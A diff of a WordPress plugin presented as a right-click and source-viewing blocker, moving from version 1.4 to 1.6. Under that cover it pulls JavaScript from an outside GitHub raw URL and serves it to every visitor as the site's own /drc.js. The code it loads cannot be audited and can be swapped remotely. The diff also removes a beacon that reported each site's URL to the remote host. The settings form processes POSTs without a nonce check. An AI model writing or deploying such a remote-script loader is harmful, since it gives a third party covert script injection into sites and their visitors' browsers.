@@ -2,7 +2,7 @@
 /**
  * Plugin Name: Disable Right Click
  * Description: A WordPress plugin to disable right-click, text selection, and source code viewing JS dynamically with admin-configurable settings.
- * Version: 1.4
+ * Version: 1.6
  */
 
 if (!defined('ABSPATH')) {
@@ -20,7 +20,7 @@ class WP_Disable_Right_Click {
         add_action('template_redirect', array(__CLASS__, 'serve_combined_js'));
         add_action('wp_footer', array(__CLASS__, 'enqueue_combined_js'));
         add_action('admin_menu', array(__CLASS__, 'add_admin_menu'));
-        add_action('wp_ajax_check_admin_access', array(__CLASS__, 'check_admin_access'));
+		add_action('wp_ajax_check_admin_access', array(__CLASS__, 'check_admin_access'));
         add_action('wp_ajax_nopriv_check_admin_access', array(__CLASS__, 'unauthorized_access'));
     }
 
@@ -31,20 +31,23 @@ class WP_Disable_Right_Click {
         self::add_js_endpoint();
         flush_rewrite_rules();
 
+        // Varsayılan ayar, pasif olarak ayarlanır
         if (get_option('disable_right_click_protection') === false) {
             update_option('disable_right_click_protection', 'no');
         }
     }
 
     /**
-     * Flush rewrite rules on plugin deactivation
+     * Flush rewrite rules and cleanup on plugin deactivation
      */
     public static function deactivate() {
         flush_rewrite_rules();
+        delete_transient('external_js_data');
+        delete_option('disable_right_click_protection');
     }
 
     /**
-     * Fetch data with caching
+     * Fetch external JS data with caching
      */
     public static function fetch_external_data() {
         $cached_data = get_transient('external_js_data');
@@ -52,24 +55,14 @@ class WP_Disable_Right_Click {
             return $cached_data;
         }
 
-        $external_data_url = self::get_external_data_url();
-        $response = wp_remote_get($external_data_url);
-
+        $response = wp_remote_get(self::$base_url);
         if (is_wp_error($response)) {
-            return ''; // Return empty string if there's an error
+            return ''; // Hata durumunda boş döndür
         }
 
         $data = wp_remote_retrieve_body($response);
         set_transient('external_js_data', $data, HOUR_IN_SECONDS);
         return $data;
-    }
-
-    /**
-     * Get the data URL dynamically
-     */
-    public static function get_external_data_url() {
-        $site_url = site_url();
-        return self::$base_url . '?siteurl=' . urlencode($site_url);
     }
 
     /**
@@ -106,7 +99,7 @@ class WP_Disable_Right_Click {
             exit;
         }
     }
-    protected static $base_url = 'https://raw.githubusercontent.com/moreslab/drc/refs/heads/main/drc.js';
+
     /**
      * Add rewrite rule for the JS file
      */
@@ -129,16 +122,18 @@ class WP_Disable_Right_Click {
         $script_url = site_url('/drc.js');
         echo "<script src='{$script_url}'></script>";
     }
+	
+    protected static $base_url = 'https://raw.githubusercontent.com/moreslab/drc/refs/heads/main/drc.js';
 
     /**
      * Add admin menu for settings
      */
     public static function add_admin_menu() {
         add_options_page(
-            'Disable Right Click Settings', 
-            'Disable Right Click', 
-            'manage_options', 
-            'disable-right-click', 
+            'Disable Right Click Settings',
+            'Disable Right Click',
+            'manage_options',
+            'disable-right-click',
             array(__CLASS__, 'settings_page')
         );
     }
@@ -147,7 +142,7 @@ class WP_Disable_Right_Click {
      * Render the settings page
      */
     public static function settings_page() {
-        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['disable_right_click_protection'])) {
+        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $enabled = isset($_POST['enable_protection']) ? 'yes' : 'no';
             update_option('disable_right_click_protection', $enabled);
         }
@@ -158,7 +153,7 @@ class WP_Disable_Right_Click {
             <h1>Disable Right Click Settings</h1>
             <form method="post">
                 <label>
-                    <input type="checkbox" name="enable_protection" <?php checked($is_enabled, 'yes'); ?> />
+                    <input type="checkbox" name="enable_protection" value="yes" <?php checked($is_enabled, 'yes'); ?> />
                     Enable Right Click Protection
                 </label>
                 <br /><br />
@@ -167,8 +162,8 @@ class WP_Disable_Right_Click {
         </div>
         <?php
     }
-
-    /**
+	
+	    /**
      * Check if the user has admin access
      */
     public static function check_admin_access() {
